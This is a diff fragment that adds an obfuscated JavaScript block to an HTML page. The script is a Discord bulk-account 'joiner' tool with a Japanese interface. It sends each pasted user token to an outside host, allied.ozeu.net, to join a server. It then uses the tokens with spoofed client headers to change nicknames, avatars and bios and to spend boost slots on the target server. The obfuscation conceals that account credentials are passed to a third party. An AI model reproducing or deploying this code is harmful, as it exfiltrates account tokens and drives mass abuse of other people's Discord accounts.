+        const _0x461eb9=_0x5d7a;function _0x5d7a(_0x246b4c,_0x164ca3){const _0x2b91ea=_0x2b91();return _0x5d7a=function(_0x5d7af3,_0x2e0787){_0x5d7af3=_0x5d7af3-0x182;let _0x4d90f4=_0x2b91ea[_0x5d7af3];return _0x4d90f4;},_0x5d7a(_0x246b4c,_0x164ca3);}function _0x2b91(){const _0x545933=['stringify','ℹ️\x20利用可能なブーストなし:\x20','toLocaleDateString','remove','trim','close','avatarInfo','split','loading','Discord',',\x20Message:\x20','then','avatar','PATCH','body','🔄\x20プロフィールメッセージ変更処理を開始...','data','⚠️\x20アバター画像のBase64変換失敗:\x20','⚠️\x20招待コードチェック失敗:\x20','❌\x20招待コードからサーバーIDを取得できませんでした:\x20','application/json','実行中...','files','catch','1016312KYymaO','skipped','forEach','Join開始','24257330VKoskd','numeric','clipboard','scrollHeight','https://discord.com/api/v9/users/@me/profile','2295159FiMxwZ','click','💥\x20Bio変更エラー:\x20','*****\x20に\x20','status','addEventListener','🖼️\x20アバター画像をBase64に変換完了:\x20','1674298bCzkLo','✅\x20ユーザー情報変更成功:\x20','🚀\x20','8raTjcM','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/136.0.0.0\x20Safari/537.36','copySuccess','*****\x20(全','2JYYZEC','*****\x20→\x20','checked','24irwUYe','disabled','join','name','❌\x20招待コード無効:\x20','keys','🟢\x20Join処理を開始','✅\x20サーバーニックネーム変更成功:\x20','READY','&invite=','textContent','INVALID_SESSION','onopen','preventDefault','guild','stopPropagation','⚠️\x20Bio変更失敗:\x20','successTokens','globalNickname','onerror','✅\x20成功\x20(Join):\x20','✅\x20画像ファイル選択済み','⚠️\x20コピー失敗:\x20','1103669JAjwSx','add','push','WebSocketエラー','length','all','):\x20','11VXyEVz','send','invite','⚠️\x20ユーザー情報変更失敗:\x20','map','📁\x20ファイル選択:\x20','long','⚠️\x20サーバーニックネーム変更失敗:\x20','⚠️\x20招待コードを入力してください','value','eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQwNDAyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6IjE2NTQzODdmLTg2NmItNDE2Ni04Zjc3LTM1ZDk2NGI3NjRmMyIsImNsaWVudF9hcHBfc3RhdGUiOiJmb2N1c2VkIn0=','filter','https://allied.ozeu.net/joiner-profile?token=','❌\x20失敗\x20(Join):\x20','startJoin','status_code','\x20(サーバーID不明)','avatarInput','onload','ℹ️\x20ブースト用スロットなし(データ無):\x20','2-digit','https://discord.com/api/v10/invites/','tokens','PUT','✅\x20招待コード有効:\x20','❌\x20認証失敗:\x20','classList','⚠️\x20ブースト失敗:\x20','getElementById','bioInput','message','change','⚠️\x20サーバーニックネーム変更スキップ:\x20サーバーIDが取得できませんでした。','📁\x20ファイルを選択','error','\x22captcha_key\x22','premium_guild_subscription','🚀\x20サーバーブースト処理を開始...','readAsDataURL','POST','2466120rTiOTn','9176067COXDTb','https://discord.com/api/v10/guilds/','global_name','*****','json','target','token','toLocaleTimeString','\x20ブースト成功:\x20','copyFailed','log','*****\x20→\x20\x22','boostCheckbox','/premium/subscriptions','Windows','slice','writeText','includes','onmessage','\x20(サーバーID:\x20','failedTokens'];_0x2b91=function(){return _0x545933;};return _0x2b91();}(function(_0x4c1bb9,_0x5c9a84){const _0x1d67b7=_0x5d7a,_0x27c37c=_0x4c1bb9();while(!![]){try{const _0x3d71fa=-parseInt(_0x1d67b7(0x18e))/0x1+parseInt(_0x1d67b7(0x195))/0x2*(parseInt(_0x1d67b7(0x187))/0x3)+parseInt(_0x1d67b7(0x20c))/0x4+-parseInt(_0x1d67b7(0x1de))/0x5+-parseInt(_0x1d67b7(0x198))/0x6*(-parseInt(_0x1d67b7(0x1af))/0x7)+parseInt(_0x1d67b7(0x191))/0x8*(-parseInt(_0x1d67b7(0x1df))/0x9)+parseInt(_0x1d67b7(0x182))/0xa*(parseInt(_0x1d67b7(0x1b6))/0xb);if(_0x3d71fa===_0x5c9a84)break;else _0x27c37c['push'](_0x27c37c['shift']());}catch(_0x364e63){_0x27c37c['push'](_0x27c37c['shift']());}}}(_0x2b91,0xd8e7f));const x_super_properties=_0x461eb9(0x1c0),user_agent=_0x461eb9(0x192),logEl=document[_0x461eb9(0x1d2)](_0x461eb9(0x1e9));function appendLog(_0x3004c8){const _0x2f148c=_0x461eb9,_0xc771ab=new Date()[_0x2f148c(0x1e6)]();logEl['textContent']+='\x0a'+_0xc771ab+'\x20-\x20'+_0x3004c8,logEl['scrollTop']=logEl[_0x2f148c(0x185)];}function parseList(_0x39a4b5){const _0xd158c5=_0x461eb9;return _0x39a4b5['split'](/[\s,]+/)[_0xd158c5(0x1ba)](_0x5adb4c=>_0x5adb4c['trim']())['filter'](Boolean);}async function copyToClipboard(_0x2c5108){const _0x51cce1=_0x461eb9;try{await navigator[_0x51cce1(0x184)][_0x51cce1(0x1ef)](_0x2c5108),appendLog('📋\x20コピーしました');}catch(_0x16dc27){appendLog(_0x51cce1(0x1ae)+_0x16dc27);}}function getCurrentDateTimeString(){const _0xafe296=_0x461eb9,_0x4ed717=new Date(),_0x27402e={'year':'numeric','month':_0xafe296(0x1bc),'day':_0xafe296(0x183)};return _0x4ed717[_0xafe296(0x1f6)]('en-US',_0x27402e)+'\x20at\x20'+_0x4ed717[_0xafe296(0x1e6)]('en-US',{'hour':_0xafe296(0x183),'minute':_0xafe296(0x1ca),'hour12':!![]});}const startBtn=document[_0x461eb9(0x1d2)](_0x461eb9(0x1c4)),successArea=document['getElementById'](_0x461eb9(0x1a9)),failedArea=document['getElementById'](_0x461eb9(0x1f3)),copySucc=document[_0x461eb9(0x1d2)](_0x461eb9(0x193)),copyFail=document['getElementById'](_0x461eb9(0x1e8)),tokensInput=document[_0x461eb9(0x1d2)](_0x461eb9(0x1cc)),inviteInput=document[_0x461eb9(0x1d2)](_0x461eb9(0x1b8)),serverNicknameInput=document[_0x461eb9(0x1d2)]('serverNickname'),globalNicknameInput=document['getElementById'](_0x461eb9(0x1aa)),avatarInput=document[_0x461eb9(0x1d2)](_0x461eb9(0x1c7)),avatarBtn=document['getElementById']('avatarBtn'),avatarInfo=document[_0x461eb9(0x1d2)](_0x461eb9(0x1fa)),bioInput=document['getElementById'](_0x461eb9(0x1d3)),boostCheckbox=document[_0x461eb9(0x1d2)](_0x461eb9(0x1eb));avatarBtn['addEventListener'](_0x461eb9(0x188),_0x470d62=>{const _0x46cc72=_0x461eb9;_0x470d62[_0x46cc72(0x1a5)](),_0x470d62[_0x46cc72(0x1a7)](),avatarInput['value']='',setTimeout(()=>{const _0x45f838=_0x46cc72;avatarInput[_0x45f838(0x188)]();},0xa);}),avatarInput[_0x461eb9(0x18c)](_0x461eb9(0x1d5),_0x16fd8c=>{const _0x1f36c5=_0x461eb9;_0x16fd8c[_0x1f36c5(0x1a5)](),_0x16fd8c[_0x1f36c5(0x1a7)]();const _0x566def=_0x16fd8c[_0x1f36c5(0x1e4)][_0x1f36c5(0x20a)][0x0];_0x566def?(avatarInfo['textContent']=''+_0x566def[_0x1f36c5(0x19b)],avatarBtn['textContent']=_0x1f36c5(0x1ad),appendLog(_0x1f36c5(0x1bb)+_0x566def[_0x1f36c5(0x19b)])):(avatarInfo[_0x1f36c5(0x1a2)]='',avatarBtn[_0x1f36c5(0x1a2)]=_0x1f36c5(0x1d7));}),copySucc['addEventListener'](_0x461eb9(0x188),()=>copyToClipboard(successArea[_0x461eb9(0x1bf)])),copyFail[_0x461eb9(0x18c)](_0x461eb9(0x188),()=>copyToClipboard(failedArea[_0x461eb9(0x1bf)])),startBtn[_0x461eb9(0x18c)]('click',async()=>{const _0x5e83d9=_0x461eb9,_0x27277e=parseList(tokensInput[_0x5e83d9(0x1bf)]),_0x46f8e0=inviteInput[_0x5e83d9(0x1bf)][_0x5e83d9(0x1f8)]();if(!_0x27277e[_0x5e83d9(0x1b3)]){appendLog('⚠️\x20トークンを入力してください');return;}if(!_0x46f8e0){appendLog(_0x5e83d9(0x1be));return;}startBtn[_0x5e83d9(0x199)]=!![],startBtn[_0x5e83d9(0x1a2)]=_0x5e83d9(0x209),startBtn[_0x5e83d9(0x1d0)][_0x5e83d9(0x1b0)](_0x5e83d9(0x1fc)),successArea['value']='',failedArea[_0x5e83d9(0x1bf)]='',logEl[_0x5e83d9(0x1a2)]='',appendLog(_0x5e83d9(0x19e));const _0x32b022=_0x46f8e0[_0x5e83d9(0x1fb)]('/')['filter'](Boolean),_0x3e4dd6=_0x32b022[_0x32b022[_0x5e83d9(0x1b3)]-0x1],_0x1e1f00=serverNicknameInput[_0x5e83d9(0x1bf)][_0x5e83d9(0x1f8)](),_0x9c745=globalNicknameInput[_0x5e83d9(0x1bf)][_0x5e83d9(0x1f8)](),_0x5aaacb=bioInput[_0x5e83d9(0x1bf)]['trim'](),_0x3d388b=boostCheckbox[_0x5e83d9(0x197)],_0x39e947=Boolean(_0x1e1f00),_0x4695a9=Boolean(_0x9c745),_0x109364=avatarInput[_0x5e83d9(0x20a)][_0x5e83d9(0x1b3)]>0x0,_0x5be6c6=Boolean(_0x5aaacb);let _0x25c40b=null;try{const _0x3fd40f=await fetch(_0x5e83d9(0x1cb)+_0x3e4dd6);if(!_0x3fd40f['ok']){const _0x402267=await _0x3fd40f[_0x5e83d9(0x1e3)]()['catch'](()=>({'message':'Unknown\x20error'}));appendLog(_0x5e83d9(0x19c)+_0x3e4dd6+'\x20(Status:\x20'+_0x3fd40f[_0x5e83d9(0x18b)]+_0x5e83d9(0x1fe)+(_0x402267[_0x5e83d9(0x1d4)]||JSON[_0x5e83d9(0x1f4)](_0x402267))+')'),startBtn['disabled']=![],startBtn[_0x5e83d9(0x1a2)]='Join開始',startBtn[_0x5e83d9(0x1d0)][_0x5e83d9(0x1f7)](_0x5e83d9(0x1fc));return;}const _0x1b2786=await _0x3fd40f[_0x5e83d9(0x1e3)]();_0x25c40b=_0x1b2786[_0x5e83d9(0x1a6)]?.['id'],!_0x25c40b&&appendLog(_0x5e83d9(0x207)+_0x3e4dd6),appendLog(_0x5e83d9(0x1ce)+_0x3e4dd6+(_0x25c40b?_0x5e83d9(0x1f2)+_0x25c40b+')':_0x5e83d9(0x1c6)));}catch(_0x162325){appendLog(_0x5e83d9(0x206)+_0x162325),startBtn[_0x5e83d9(0x199)]=![],startBtn[_0x5e83d9(0x1a2)]=_0x5e83d9(0x20f),startBtn[_0x5e83d9(0x1d0)][_0x5e83d9(0x1f7)](_0x5e83d9(0x1fc));return;}const _0x4ca620=_0x27277e[_0x5e83d9(0x1ba)](_0x18311e=>fetch('https://allied.ozeu.net/joiner?token='+encodeURIComponent(_0x18311e)+_0x5e83d9(0x1a1)+encodeURIComponent(_0x3e4dd6))[_0x5e83d9(0x1ff)](async _0x445550=>{const _0x116283=_0x5e83d9,_0x3166d0=await _0x445550[_0x116283(0x1e3)]()[_0x116283(0x20b)](()=>null);return{'token':_0x18311e,'status':_0x445550['status'],'body':_0x3166d0};})[_0x5e83d9(0x20b)](_0x559a51=>({'token':_0x18311e,'error':_0x559a51}))),_0x1ed070=await Promise[_0x5e83d9(0x1b4)](_0x4ca620),_0x5849a1=[],_0x1dac43=[];_0x1ed070[_0x5e83d9(0x20e)](_0xc9cc05=>{const _0x227fe2=_0x5e83d9;if(_0xc9cc05[_0x227fe2(0x18b)]===0xc8&&_0xc9cc05['body']?.[_0x227fe2(0x1c5)]===0xc8)_0x5849a1[_0x227fe2(0x1b1)](_0xc9cc05[_0x227fe2(0x1e5)]),appendLog(_0x227fe2(0x1ac)+_0xc9cc05[_0x227fe2(0x1e5)]['slice'](0x0,0xa)+_0x227fe2(0x1e2));else{_0x1dac43[_0x227fe2(0x1b1)](_0xc9cc05[_0x227fe2(0x1e5)]);const _0x503d2d=_0xc9cc05[_0x227fe2(0x202)]?JSON['stringify'](_0xc9cc05[_0x227fe2(0x202)]):String(_0xc9cc05[_0x227fe2(0x1d8)]||_0xc9cc05[_0x227fe2(0x18b)]);_0x503d2d[_0x227fe2(0x1f0)](_0x227fe2(0x1d9))?appendLog('❌\x20CAPTCHA\x20(Join):\x20'+_0xc9cc05[_0x227fe2(0x1e5)]['slice'](0x0,0xa)+_0x227fe2(0x1e2)):appendLog(_0x227fe2(0x1c3)+_0xc9cc05['token'][_0x227fe2(0x1ee)](0x0,0xa)+'*****\x20→\x20'+_0x503d2d);}}),successArea[_0x5e83d9(0x1bf)]=_0x5849a1[_0x5e83d9(0x19a)]('\x0a'),failedArea['value']=_0x1dac43[_0x5e83d9(0x19a)]('\x0a');if(_0x39e947&&_0x25c40b&&_0x5849a1[_0x5e83d9(0x1b3)]>0x0){const _0x49ca48=_0x5849a1[_0x5e83d9(0x1ba)](async _0x12dfe=>{const _0x5ca8b2=_0x5e83d9;try{const _0x538a12=await fetch(_0x5ca8b2(0x1e0)+_0x25c40b+'/members/@me',{'method':'PATCH','headers':{'Authorization':_0x12dfe,'Content-Type':_0x5ca8b2(0x208),'user-agent':user_agent,'x-super-properties':x_super_properties},'body':JSON[_0x5ca8b2(0x1f4)]({'nick':_0x1e1f00})});if(_0x538a12['ok'])appendLog(_0x5ca8b2(0x19f)+_0x12dfe[_0x5ca8b2(0x1ee)](0x0,0xa)+_0x5ca8b2(0x1ea)+_0x1e1f00+'\x22');else{const _0x559272=await _0x538a12[_0x5ca8b2(0x1e3)]()['catch'](()=>null),_0x295212=_0x559272?JSON[_0x5ca8b2(0x1f4)](_0x559272):_0x538a12[_0x5ca8b2(0x18b)];appendLog(_0x5ca8b2(0x1bd)+_0x12dfe[_0x5ca8b2(0x1ee)](0x0,0xa)+_0x5ca8b2(0x196)+_0x295212);}}catch(_0x10da7b){appendLog('💥\x20サーバーニックネーム変更エラー:\x20'+_0x12dfe['slice'](0x0,0xa)+_0x5ca8b2(0x196)+_0x10da7b);}});await Promise['all'](_0x49ca48);}else _0x39e947&&!_0x25c40b&&appendLog(_0x5e83d9(0x1d6));if((_0x4695a9||_0x109364)&&_0x5849a1[_0x5e83d9(0x1b3)]>0x0){let _0x562a86=null,_0xaff75=null;if(_0x109364){const _0xc6d2e0=avatarInput[_0x5e83d9(0x20a)][0x0];_0xaff75=_0xc6d2e0[_0x5e83d9(0x19b)];try{_0x562a86=await new Promise((_0x668914,_0x4e5526)=>{const _0x4cedc4=_0x5e83d9,_0x32c314=new FileReader();_0x32c314[_0x4cedc4(0x1c8)]=()=>_0x668914(_0x32c314['result']),_0x32c314[_0x4cedc4(0x1ab)]=_0x3b8b39=>_0x4e5526(_0x3b8b39),_0x32c314[_0x4cedc4(0x1dc)](_0xc6d2e0);}),appendLog(_0x5e83d9(0x18d)+_0xaff75);}catch(_0x450dad){appendLog(_0x5e83d9(0x205)+_0x450dad),_0x109364=![];}}const _0x2efb7c=_0x5849a1[_0x5e83d9(0x1ba)](_0x4a30da=>new Promise(_0x5d68ba=>{const _0x5c68b4=_0x5e83d9,_0x3103c5={};if(_0x4695a9)_0x3103c5[_0x5c68b4(0x1e1)]=_0x9c745;if(_0x109364&&_0x562a86)_0x3103c5[_0x5c68b4(0x200)]=_0x562a86;if(Object[_0x5c68b4(0x19d)](_0x3103c5)['length']===0x0)return appendLog('ℹ️\x20スキップ\x20(変更なし):\x20'+_0x4a30da[_0x5c68b4(0x1ee)](0x0,0xa)+'*****'),_0x5d68ba({'token':_0x4a30da,'skipped':!![]});const _0x2a31b9=new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');_0x2a31b9[_0x5c68b4(0x1a4)]=()=>{const _0x7e645b=_0x5c68b4;_0x2a31b9[_0x7e645b(0x1b7)](JSON[_0x7e645b(0x1f4)]({'op':0x2,'d':{'token':_0x4a30da,'properties':{'os':_0x7e645b(0x1ed),'browser':_0x7e645b(0x1fd),'device':'pc'},'intents':0x0}}));},_0x2a31b9[_0x5c68b4(0x1f1)]=async _0x323abb=>{const _0x36f075=_0x5c68b4,_0x29ae0f=JSON['parse'](_0x323abb[_0x36f075(0x204)]);if(_0x29ae0f['t']===_0x36f075(0x1a0))try{const _0x43b1ec=await fetch(_0x36f075(0x1c2)+encodeURIComponent(_0x4a30da),{'method':_0x36f075(0x1dd),'headers':{'Content-Type':_0x36f075(0x208)},'body':JSON['stringify'](_0x3103c5)}),_0x10300d=await _0x43b1ec['json']()['catch'](()=>null);_0x2a31b9['close'](),_0x5d68ba({'token':_0x4a30da,'status':_0x43b1ec['status'],'body':_0x10300d});}catch(_0x3100cd){_0x2a31b9[_0x36f075(0x1f9)](),_0x5d68ba({'token':_0x4a30da,'error':_0x3100cd});}else _0x29ae0f['t']===_0x36f075(0x1a3)&&(_0x2a31b9[_0x36f075(0x1f9)](),_0x5d68ba({'token':_0x4a30da,'status':0x191,'body':{'error':_0x36f075(0x1a3)}}));},_0x2a31b9['onerror']=()=>{const _0x5ed4a5=_0x5c68b4;_0x2a31b9[_0x5ed4a5(0x1f9)](),_0x5d68ba({'token':_0x4a30da,'error':_0x5ed4a5(0x1b2)});},_0x2a31b9['onclose']=()=>{_0x5d68ba({'token':_0x4a30da,'error':'WebSocket切断'});};})),_0x438801=await Promise['all'](_0x2efb7c);_0x438801[_0x5e83d9(0x20e)](_0x57bed9=>{const _0x239c2d=_0x5e83d9;if(_0x57bed9[_0x239c2d(0x20d)])return;if(_0x57bed9[_0x239c2d(0x18b)]===0xc8&&_0x57bed9[_0x239c2d(0x202)]?.[_0x239c2d(0x1c5)]===0xc8){let _0x506e47=_0x239c2d(0x18f)+_0x57bed9[_0x239c2d(0x1e5)][_0x239c2d(0x1ee)](0x0,0xa)+_0x239c2d(0x1e2);if(_0x4695a9)_0x506e47+='\x20→\x20グローバルネーム=\x22'+_0x9c745+'\x22';if(_0x109364&&_0x562a86)_0x506e47+='\x20→\x20アイコン変更済';appendLog(_0x506e47);}else{const _0x1e51fe=_0x57bed9[_0x239c2d(0x202)]?JSON[_0x239c2d(0x1f4)](_0x57bed9[_0x239c2d(0x202)]):String(_0x57bed9[_0x239c2d(0x1d8)]||_0x57bed9['status']);_0x1e51fe[_0x239c2d(0x1f0)](_0x239c2d(0x1a3))?appendLog(_0x239c2d(0x1cf)+_0x57bed9['token'][_0x239c2d(0x1ee)](0x0,0xa)+_0x239c2d(0x196)+_0x1e51fe):appendLog(_0x239c2d(0x1b9)+_0x57bed9[_0x239c2d(0x1e5)][_0x239c2d(0x1ee)](0x0,0xa)+_0x239c2d(0x196)+_0x1e51fe);}});}if(_0x5be6c6&&_0x5849a1[_0x5e83d9(0x1b3)]>0x0){appendLog(_0x5e83d9(0x203));const _0x19b748=_0x5849a1[_0x5e83d9(0x1ba)](async _0x5cda1e=>{const _0x299777=_0x5e83d9;try{const _0x4cce64=await fetch(_0x299777(0x186),{'method':_0x299777(0x201),'headers':{'Authorization':_0x5cda1e,'Content-Type':_0x299777(0x208),'user-agent':user_agent,'x-super-properties':x_super_properties},'body':JSON['stringify']({'bio':_0x5aaacb})});if(_0x4cce64['ok'])appendLog('✅\x20Bio変更成功:\x20'+_0x5cda1e[_0x299777(0x1ee)](0x0,0xa)+'*****\x20→\x20\x22'+_0x5aaacb+'\x22');else{const _0xe38bf4=await _0x4cce64[_0x299777(0x1e3)]()['catch'](()=>null),_0x48045a=_0xe38bf4?JSON['stringify'](_0xe38bf4):_0x4cce64[_0x299777(0x18b)];appendLog(_0x299777(0x1a8)+_0x5cda1e[_0x299777(0x1ee)](0x0,0xa)+'*****\x20→\x20'+_0x48045a);}}catch(_0x2caeb1){appendLog(_0x299777(0x189)+_0x5cda1e[_0x299777(0x1ee)](0x0,0xa)+'*****\x20→\x20'+_0x2caeb1);}});await Promise[_0x5e83d9(0x1b4)](_0x19b748);}if(_0x3d388b&&_0x25c40b&&_0x5849a1['length']>0x0){appendLog(_0x5e83d9(0x1db));const _0x1fc7ea=_0x5849a1[_0x5e83d9(0x1ba)](async _0x3ca3ba=>{const _0x424db2=_0x5e83d9;try{const _0x17dcd2=await fetch('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',{'headers':{'Authorization':_0x3ca3ba}});if(!_0x17dcd2['ok']){appendLog('⚠️\x20スロット取得失敗\x20('+_0x17dcd2[_0x424db2(0x18b)]+_0x424db2(0x1b5)+_0x3ca3ba[_0x424db2(0x1ee)](0x0,0xa)+_0x424db2(0x1e2));return;}const _0x33878d=await _0x17dcd2['json']()[_0x424db2(0x20b)](()=>[]);if(!Array['isArray'](_0x33878d)||_0x33878d[_0x424db2(0x1b3)]===0x0){appendLog(_0x424db2(0x1c9)+_0x3ca3ba[_0x424db2(0x1ee)](0x0,0xa)+'*****');return;}const _0x3de02a=_0x33878d[_0x424db2(0x1c1)](_0x869d89=>_0x869d89[_0x424db2(0x1da)]===null),_0xe76d2e=_0x3de02a[_0x424db2(0x1b3)];if(_0xe76d2e===0x0){appendLog(_0x424db2(0x1f5)+_0x3ca3ba[_0x424db2(0x1ee)](0x0,0xa)+_0x424db2(0x194)+_0x33878d['length']+'スロット使用中)');return;}const _0x12b004=_0x3de02a['map'](_0x44e8af=>_0x44e8af['id']);appendLog('ℹ️\x20'+_0x3ca3ba[_0x424db2(0x1ee)](0x0,0xa)+_0x424db2(0x18a)+_0xe76d2e+'個の空きブーストスロット検出。');const _0x3d09bb=await fetch('https://discord.com/api/v9/guilds/'+_0x25c40b+_0x424db2(0x1ec),{'method':_0x424db2(0x1cd),'headers':{'Authorization':_0x3ca3ba,'Content-Type':_0x424db2(0x208)},'body':JSON['stringify']({'user_premium_guild_subscription_slot_ids':_0x12b004,'disable_powerup_auto_apply':![]})});if(_0x3d09bb['ok'])appendLog(_0x424db2(0x190)+_0xe76d2e+_0x424db2(0x1e7)+_0x3ca3ba['slice'](0x0,0xa)+'*****');else{const _0x2884f1=await _0x3d09bb[_0x424db2(0x1e3)]()[_0x424db2(0x20b)](()=>null),_0x7ad9f6=_0x2884f1?JSON['stringify'](_0x2884f1):_0x3d09bb[_0x424db2(0x18b)];appendLog(_0x424db2(0x1d1)+_0x3ca3ba['slice'](0x0,0xa)+_0x424db2(0x196)+_0x7ad9f6);}}catch(_0x55e2fb){appendLog('💥\x20ブースト処理中にエラー:\x20'+_0x3ca3ba[_0x424db2(0x1ee)](0x0,0xa)+'*****\x20→\x20'+_0x55e2fb);}});await Promise[_0x5e83d9(0x1b4)](_0x1fc7ea);}else _0x3d388b&&!_0x25c40b&&appendLog('⚠️\x20サーバーブーストスキップ:\x20サーバーIDが取得できませんでした。');appendLog('🎉\x20全処理完了'),startBtn[_0x5e83d9(0x199)]=![],startBtn[_0x5e83d9(0x1a2)]=_0x5e83d9(0x20f),startBtn['classList'][_0x5e83d9(0x1f7)]('loading');});
+    </script>
 </body>
 </html>
